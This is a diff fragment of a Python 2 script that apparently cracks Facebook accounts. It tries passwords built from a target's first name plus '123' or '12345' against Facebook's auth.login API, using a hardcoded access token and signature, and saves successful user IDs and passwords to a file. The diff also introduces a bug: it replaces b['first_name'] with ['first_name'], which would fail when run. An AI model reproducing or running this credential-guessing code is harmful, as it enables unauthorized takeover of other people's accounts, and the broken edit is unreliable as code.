@@ -188,7 +188,7 @@ def pilih_menu():
 		except OSError:
 			pass
 		try:
-			pass1 = b['first_name'].lower()+'123'
+			pass1 = ['first_name'].lower()+'123'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -205,7 +205,7 @@ def pilih_menu():
 					save.write(str(uid)+' | '+str(pass1)+'\n')
 					save.close()
 				else:
-					pass2 = b['first_name'].lower()+'12345'
+					pass2 = ['first_name'].lower()+'12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
